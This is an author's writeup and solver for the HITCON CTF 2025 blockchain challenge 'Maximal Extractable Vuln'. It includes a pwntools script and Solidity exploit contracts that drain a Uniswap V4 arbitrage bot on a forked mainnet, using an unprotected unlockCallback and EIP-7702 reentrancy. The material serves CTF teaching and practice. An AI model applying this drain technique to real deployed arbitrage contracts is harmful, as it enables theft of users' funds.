---
title: "Maximal Extractable Vuln - Hitcon CTF 2025"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["minaminao-my-ctf-challenges", "author-solution", "challenge-source", "solidity", "foundry", "proof-of-work", "subprocess", "blockchain", "hitcon-ctf-2025"]
summary: "Maximal Extractable Vuln is a blockchain challenge created for HITCON CTF 2025."
source:
  name: "minaminao/my-ctf-challenges"
  url: "https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2025/maximal-extractable-vuln"
license: "none stated"
ctf:
  name: "Hitcon CTF 2025"
  year: 2025
  challenge: "Maximal Extractable Vuln"
---

## Challenge

- **Author:** [minaminao](https://github.com/minaminao)
- **Source:** <https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2025/maximal-extractable-vuln>
- **CTF:** Hitcon CTF 2025

---

# Maximal Extractable Vuln

**Maximal Extractable Vuln** is a blockchain challenge created for HITCON CTF 2025.

This directory includes:
- [distfiles](./distfiles/): the distributed files for players
- [server](./server/): the challenge server based on [my previous challenge](https://github.com/minaminao/my-ctf-challenges/tree/main/ctfs/seccon-ctf-13-quals/trillion-ether).
- [solver](./solver/): the author's solver and writeup.

## Description

A newly deployed, simple Uniswap V4 arbitrage contract has been identified 🤖

```
nc maximal-extractive-vuln.chal.hitconctf.com 31337
```

## Launch a challenge server

Set the `FORKING_RPC_URL` in `compose.yaml` to your mainnet RPC endpoint (for example, Alchemy) to deploy the challenge contract on a network forked from the Ethereum mainnet.

Run:
```
make start-challenge-server-local
```

## Access the challenge server

```
nc localhost 31337
```

Good luck!

## Run the author's solver

```
make run-solver-local
```


## Author's solver notes

# Solver

## Brief Writeup

You are given the `Setup` contract and the bytecode of a simple Uniswap V4 arbitrage contract in it.
The goal is to drain funds from the arbitrage contract.

The entry point of the arbitrage is the `execute` function.
When this is called, the `POOL_MANAGER` becomes unlocked, and then `unlockCallback` is invoked.
Eventually, any profit is transferred to `ORIGIN`.
If no profit is made, the execution fails.

The first vulnerability lies in `unlockCallback`. The access is not restricted to `POOL_MANAGER`, so anyone can call it.

The second vulnerability is that the arbitrage contract fails to consider EIP-7702.
This challenge network is a fork of mainnet, and this allows you to set code on `ORIGIN`, which enables a reentrancy attack through `ORIGIN`.

Thus, you first need to generate profit so that funds are sent to `ORIGIN`.
There are multiple ways to achieve this.
One straightforward idea is to construct an arbitrage path using your own custom token.

After that, `unlockCallback` can be called to drain funds from the `POOL_MANAGER`.
However, since the `POOL_MANAGER` is not unlocked at that point, direct transfers will throw an error.
To bypass this, you first wrap the call in `unlock`, and then execute it.
The resulting call stack looks like this: `ORIGIN` -> `unlockCallback` -> `unlock` -> `unlockCallback` -> transfer logic.

The concrete exploit is implemented in:
* [Exploit.s.sol](./src/Exploit.s.sol)
* [Exploit.sol](./src/Exploit.sol)


## Solver: `solve.py`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2025/maximal-extractable-vuln/solver/solve.py>

```python
import hashlib
import os
import subprocess

from pwn import remote

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "31337")

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recvuntil(b"action? ")
r.sendline(b"1")


def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


solve_pow(r)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode()
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"your address:")
player_addr = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
challenge_addr = r.recvline().strip().decode()
r.close()

env = os.environ.copy()
env["PRIVATE_KEY"] = private_key
env["INSTANCE_ADDR"] = challenge_addr
res = subprocess.run(
    [
        "forge",
        "script",
        "ExploitScript",
        "--private-key",
        private_key,
        "--broadcast",
        "--rpc-url",
        rpc_url,
        # super rough mitigation for a bug related to Anvil and RPC
        "--skip-simulation",
        "--compute-units-per-second",
        "50",
        "--with-gas-price",
        "10 gwei",
        "--block-gas-limit",
        "1000000000",
        "--isolate",
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    env=env,
)

print(res.stdout.decode())
assert res.returncode == 0, res.stderr

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recv()
r.sendline(b"3")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: \n")
flag = r.recvline().strip()
print(flag)
```


## Solver: `Exploit.s.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2025/maximal-extractable-vuln/solver/src/Exploit.s.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {Script} from "forge-std/Script.sol";
import {Exploit} from "./Exploit.sol";
import {Setup} from "./challenge/Setup.sol";

// forge script dev/src/Exploit.s.sol --private-key $PRIVATE_KEY -vvvvv --broadcast

contract ExploitScript is Script {
    function run() public {
        address instanceAddr = vm.envAddress("INSTANCE_ADDR");
        uint256 playerPrivateKey = vm.envUint("PRIVATE_KEY");

        Setup setup = Setup(instanceAddr);

        vm.startBroadcast();
        Exploit exploit = new Exploit{value: 0.2 ether}(setup.BOT_ADDR());
        vm.signAndAttachDelegation(address(exploit), playerPrivateKey);
        exploit.exploit();
        vm.stopBroadcast();

        require(setup.isSolved(), "not solved");
    }
}
```


## Solver: `Exploit.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2025/maximal-extractable-vuln/solver/src/Exploit.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {IPermit2} from "@uniswap/permit2/src/interfaces/IPermit2.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolInitializer_v4} from "@uniswap/v4-periphery/src/interfaces/IPoolInitializer_v4.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {IAllowanceTransfer} from "@uniswap/permit2/src/interfaces/IAllowanceTransfer.sol";
import {IUniversalRouter} from "@uniswap/universal-router/contracts/interfaces/IUniversalRouter.sol";
import {SwapParams} from "@uniswap/v4-periphery/lib/v4-core/src/types/PoolOperation.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

/*
    Overall, the parameters are rough, so the specific values do not have any particular meaning.
*/

contract Exploit {
    IBot immutable BOT;
    bool transient flag;

    Token public immutable TOKEN;

    IPositionManager public immutable POSITION_MANAGER = IPositionManager(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e);
    IPoolManager public immutable POOL_MANAGER = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    IPermit2 public immutable PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IUniversalRouter public immutable UNIVERSAL_ROUTER =
        IUniversalRouter(payable(0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af));

    constructor(address botAddr) payable {
        BOT = IBot(botAddr);
        TOKEN = new Token();

        _createPool(0);
        _createPool(1);
    }

    function exploit() external {
        CallData[] memory data = _constructArbitrageParams();
        BOT.execute(abi.encode(data));
    }

    function _createPool(uint256 poolIndex) private {
        PoolKey memory pool = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(TOKEN)),
            fee: uint24(poolIndex),
            tickSpacing: 200,
            hooks: IHooks(address(0))
        });

        uint160 startingPrice = poolIndex == 0 ? 0x1000000000000000000000000 : 71305346262837903834189555302;
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encodeWithSelector(IPoolInitializer_v4.initializePool.selector, pool, startingPrice);

        bytes memory actions = abi.encodePacked(uint8(Actions.MINT_POSITION), uint8(Actions.SETTLE_PAIR));

        bytes[] memory mintParams = new bytes[](2);
        {
            int24 tickLower = -486400;
            int24 tickUpper = 486400;
            uint256 liquidity = 0.05 ether;
            uint128 amount0Max = 0.1 ether;
            uint128 amount1Max = 0.1 ether;
            address owner = address(this);
            bytes memory hookData = bytes("");

            mintParams[0] = abi.encode(pool, tickLower, tickUpper, liquidity, amount0Max, amount1Max, owner, hookData);
            mintParams[1] = abi.encode(Currency.wrap(address(0)), Currency.wrap(address(TOKEN)));
        }

        uint256 deadline = block.timestamp + 60;
        params[1] = abi.encodeWithSelector(
            IPositionManager.modifyLiquidities.selector, abi.encode(actions, mintParams), deadline
        );

        TOKEN.approve(address(PERMIT2), type(uint256).max);
        IAllowanceTransfer(address(PERMIT2)).approve(
            address(TOKEN), address(POSITION_MANAGER), type(uint160).max, type(uint48).max
        );

        POSITION_MANAGER.multicall{value: 0.1 ether}(params);
    }

    function _constructArbitrageParams() private view returns (CallData[] memory) {
        CallData[] memory data = new CallData[](3);

        {
            PoolKey memory poolKey = PoolKey({
                currency0: Currency.wrap(address(0)),
                currency1: Currency.wrap(address(TOKEN)),
                fee: 0,
                tickSpacing: 200,
                hooks: IHooks(address(0))
            });
            SwapParams memory swapParams = SwapParams({
                zeroForOne: true,
                amountSpecified: -0.001 ether,
                sqrtPriceLimitX96: uint160(type(uint80).max)
            });

            data[0].selector = IPoolManager.swap.selector;
            data[0].params = abi.encode(poolKey, swapParams, bytes(""));
        }

        {
            PoolKey memory poolKey = PoolKey({
                currency0: Currency.wrap(address(0)),
                currency1: Currency.wrap(address(TOKEN)),
                fee: 1,
                tickSpacing: 200,
                hooks: IHooks(address(0))
            });
            SwapParams memory swapParams =
                SwapParams({zeroForOne: false, amountSpecified: -980392156862745, sqrtPriceLimitX96: type(uint152).max});

            data[1].selector = IPoolManager.swap.selector;
            data[1].params = abi.encode(poolKey, swapParams, bytes(""));
        }

        data[2].selector = IPoolManager.take.selector;
        data[2].params = abi.encode(Currency.wrap(address(0)), address(BOT), 184552264062947);

        return data;
    }

    receive() external payable {
        if (!flag) {
            flag = true;
            CallData[] memory data2 = new CallData[](2);
            data2[0].selector = IPoolManager.take.selector;
            data2[0].params = abi.encode(Currency.wrap(address(0)), address(this), address(BOT).balance);
            data2[1].selector = IPoolManager.settle.selector;
            data2[1].value = address(BOT).balance;

            CallData[] memory data = new CallData[](1);

            data[0].selector = IPoolManager.unlock.selector;
            data[0].params = abi.encode(abi.encode(data2));

            BOT.unlockCallback(abi.encode(data));
            flag = false;
        }
    }
}

contract Token is ERC20 {
    constructor() ERC20("Token", "TKN") {
        _mint(msg.sender, 1_000_000 * 10 ** decimals());
    }
}

struct CallData {
    bytes4 selector;
    uint256 value;
    bytes params;
}

interface IBot {
    function execute(bytes calldata data) external payable;
    function unlockCallback(bytes calldata data) external returns (bytes memory);
}
```


## Solver: `Setup.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2025/maximal-extractable-vuln/solver/src/challenge/Setup.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

contract Setup {
    uint256 constant DEPOSIT = 1000 ether;
    address public immutable PLAYER_ADR;
    address public immutable BOT_ADDR;

    constructor(address playerAddr) payable {
        require(msg.value == DEPOSIT, "Invalid initial balance");
        PLAYER_ADR = playerAddr;

        // Since this is an arbitrage contract for a MEV bot, including the source wouldn't make sense, but it's super simple. BYTECODE IS LAW ;p
        bytes memory bytecode =
            hex"608060405260015f5f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff0219169083151502179055506111f0806100655f395ff3fe608060405260043610610058575f3560e01c806309c5eabe1461006357806351cff8d91461007f57806353d6fd59146100a757806362308e85146100cf57806391dd7346146100f95780639b19251a146101355761005f565b3661005f57005b5f5ffd5b61007d600480360381019061007891906107b1565b610171565b005b34801561008a575f5ffd5b506100a560048036038101906100a09190610856565b610334565b005b3480156100b2575f5ffd5b506100cd60048036038101906100c891906108b6565b610468565b005b3480156100da575f5ffd5b506100e3610547565b6040516100f0919061094f565b60405180910390f35b348015610104575f5ffd5b5061011f600480360381019061011a91906107b1565b61055a565b60405161012c91906109d8565b60405180910390f35b348015610140575f5ffd5b5061015b60048036038101906101569190610856565b610723565b6040516101689190610a07565b60405180910390f35b60015f5f6101000a815c8160ff021916908315150217905d505f4790506e04444c5dc75cb358380d2e3de08a9073ffffffffffffffffffffffffffffffffffffffff166348c8949184846040518363ffffffff1660e01b81526004016101d8929190610a5a565b5f604051808303815f875af11580156101f3573d5f5f3e3d5ffd5b505050506040513d5f823e3d601f19601f8201168201806040525081019061021b9190610b96565b505f81476102299190610c13565b90505f811161026d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161026490610ca0565b60405180910390fd5b5f3273ffffffffffffffffffffffffffffffffffffffff168260405161029290610ceb565b5f6040518083038185875af1925050503d805f81146102cc576040519150601f19603f3d011682016040523d82523d5f602084013e6102d1565b606091505b5050905080610315576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161030c90610d49565b60405180910390fd5b5f5f5f6101000a815c8160ff021916908315150217905d505050505050565b5f5f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff166103bc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103b390610db1565b60405180910390fd5b5f8173ffffffffffffffffffffffffffffffffffffffff16476040516103e190610ceb565b5f6040518083038185875af1925050503d805f811461041b576040519150601f19603f3d011682016040523d82523d5f602084013e610420565b606091505b5050905080610464576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161045b90610d49565b60405180910390fd5b5050565b5f5f3373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f9054906101000a900460ff166104f0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104e790610db1565b60405180910390fd5b805f5f8473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff0219169083151502179055505050565b6e04444c5dc75cb358380d2e3de08a9081565b60605f5f905c906101000a900460ff166105a9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105a090610e19565b60405180910390fd5b5f83838101906105b99190611087565b90505f5f90505b815181101561070a575f6e04444c5dc75cb358380d2e3de08a9073ffffffffffffffffffffffffffffffffffffffff16838381518110610603576106026110ce565b5b602002602001015160200151848481518110610622576106216110ce565b5b60200260200101515f01518585815181106106405761063f6110ce565b5b60200260200101516040015160405160200161065d92919061114b565b6040516020818303038152906040526040516106799190611172565b5f6040518083038185875af1925050503d805f81146106b3576040519150601f19603f3d011682016040523d82523d5f602084013e6106b8565b606091505b50509050806106fc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106f3906111d2565b60405180910390fd5b5080806001019150506105c0565b5060405180602001604052805f81525091505092915050565b5f602052805f5260405f205f915054906101000a900460ff1681565b5f604051905090565b5f5ffd5b5f5ffd5b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f84011261077157610770610750565b5b8235905067ffffffffffffffff81111561078e5761078d610754565b5b6020830191508360018202830111156107aa576107a9610758565b5b9250929050565b5f5f602083850312156107c7576107c6610748565b5b5f83013567ffffffffffffffff8111156107e4576107e361074c565b5b6107f08582860161075c565b92509250509250929050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610825826107fc565b9050919050565b6108358161081b565b811461083f575f5ffd5b50565b5f813590506108508161082c565b92915050565b5f6020828403121561086b5761086a610748565b5b5f61087884828501610842565b91505092915050565b5f8115159050919050565b61089581610881565b811461089f575f5ffd5b50565b5f813590506108b08161088c565b92915050565b5f5f604083850312156108cc576108cb610748565b5b5f6108d985828601610842565b92505060206108ea858286016108a2565b9150509250929050565b5f819050919050565b5f61091761091261090d846107fc565b6108f4565b6107fc565b9050919050565b5f610928826108fd565b9050919050565b5f6109398261091e565b9050919050565b6109498161092f565b82525050565b5f6020820190506109625f830184610940565b92915050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f6109aa82610968565b6109b48185610972565b93506109c4818560208601610982565b6109cd81610990565b840191505092915050565b5f6020820190508181035f8301526109f081846109a0565b905092915050565b610a0181610881565b82525050565b5f602082019050610a1a5f8301846109f8565b92915050565b828183375f83830152505050565b5f610a398385610972565b9350610a46838584610a20565b610a4f83610990565b840190509392505050565b5f6020820190508181035f830152610a73818486610a2e565b90509392505050565b5f5ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b610ab682610990565b810181811067ffffffffffffffff82111715610ad557610ad4610a80565b5b80604052505050565b5f610ae761073f565b9050610af38282610aad565b919050565b5f67ffffffffffffffff821115610b1257610b11610a80565b5b610b1b82610990565b9050602081019050919050565b5f610b3a610b3584610af8565b610ade565b905082815260208101848484011115610b5657610b55610a7c565b5b610b61848285610982565b509392505050565b5f82601f830112610b7d57610b7c610750565b5b8151610b8d848260208601610b28565b91505092915050565b5f60208284031215610bab57610baa610748565b5b5f82015167ffffffffffffffff811115610bc857610bc761074c565b5b610bd484828501610b69565b91505092915050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610c1d82610bdd565b9150610c2883610bdd565b9250828203905081811115610c4057610c3f610be6565b5b92915050565b5f82825260208201905092915050565b7f4e6f2070726f666974206d6164650000000000000000000000000000000000005f82015250565b5f610c8a600e83610c46565b9150610c9582610c56565b602082019050919050565b5f6020820190508181035f830152610cb781610c7e565b9050919050565b5f81905092915050565b50565b5f610cd65f83610cbe565b9150610ce182610cc8565b5f82019050919050565b5f610cf582610ccb565b9150819050919050565b7f5472616e73666572206661696c656400000000000000000000000000000000005f82015250565b5f610d33600f83610c46565b9150610d3e82610cff565b602082019050919050565b5f6020820190508181035f830152610d6081610d27565b9050919050565b7f4e6f742077686974656c697374656400000000000000000000000000000000005f82015250565b5f610d9b600f83610c46565b9150610da682610d67565b602082019050919050565b5f6020820190508181035f830152610dc881610d8f565b9050919050565b7f4e6f7420657865637574696e67000000000000000000000000000000000000005f82015250565b5f610e03600d83610c46565b9150610e0e82610dcf565b602082019050919050565b5f6020820190508181035f830152610e3081610df7565b9050919050565b5f67ffffffffffffffff821115610e5157610e50610a80565b5b602082029050602081019050919050565b5f5ffd5b5f5ffd5b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b610e9e81610e6a565b8114610ea8575f5ffd5b50565b5f81359050610eb981610e95565b92915050565b610ec881610bdd565b8114610ed2575f5ffd5b50565b5f81359050610ee381610ebf565b92915050565b5f610efb610ef684610af8565b610ade565b905082815260208101848484011115610f1757610f16610a7c565b5b610f22848285610a20565b509392505050565b5f82601f830112610f3e57610f3d610750565b5b8135610f4e848260208601610ee9565b91505092915050565b5f60608284031215610f6c57610f6b610e62565b5b610f766060610ade565b90505f610f8584828501610eab565b5f830152506020610f9884828501610ed5565b602083015250604082013567ffffffffffffffff811115610fbc57610fbb610e66565b5b610fc884828501610f2a565b60408301525092915050565b5f610fe6610fe184610e37565b610ade565b9050808382526020820190506020840283018581111561100957611008610758565b5b835b8181101561105057803567ffffffffffffffff81111561102e5761102d610750565b5b80860161103b8982610f57565b8552602085019450505060208101905061100b565b5050509392505050565b5f82601f83011261106e5761106d610750565b5b813561107e848260208601610fd4565b91505092915050565b5f6020828403121561109c5761109b610748565b5b5f82013567ffffffffffffffff8111156110b9576110b861074c565b5b6110c58482850161105a565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b61111561111082610e6a565b6110fb565b82525050565b5f61112582610968565b61112f8185610cbe565b935061113f818560208601610982565b80840191505092915050565b5f6111568285611104565b600482019150611166828461111b565b91508190509392505050565b5f61117d828461111b565b915081905092915050565b7f43616c6c6261636b20657865637574696f6e206661696c6564000000000000005f82015250565b5f6111bc601983610c46565b91506111c782611188565b602082019050919050565b5f6020820190508181035f8301526111e9816111b0565b905091905056";
        address addr;
        assembly {
            addr := create(DEPOSIT, add(bytecode, 0x20), mload(bytecode))
        }
        BOT_ADDR = addr;
    }

    function isSolved() external view returns (bool) {
        return BOT_ADDR.balance == 0 && PLAYER_ADR.balance >= DEPOSIT;
    }
}
```
